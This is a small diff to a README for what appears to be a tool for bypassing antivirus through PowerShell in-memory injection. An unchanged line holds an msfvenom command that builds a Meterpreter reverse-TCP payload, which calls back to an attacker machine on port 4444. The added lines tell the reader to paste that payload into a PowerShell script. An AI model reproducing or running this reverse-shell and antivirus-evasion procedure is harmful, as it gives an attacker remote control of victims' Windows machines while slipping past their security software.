@@ -12,3 +12,5 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IPkali LPORT=4444 -f powershel
 
 ![Captura de pantalla 2023-02-27 210003.jpg](https://raw.githubusercontent.com/sergiovks/AntiVirus-Bypass-PowerShell-In-Memory-Injection/main/Captura%20de%20pantalla%202023-02-27%20210003.jpg)
 
+<h3>And paste the payload to the 15th line of the .ps1 file:</h3>
+
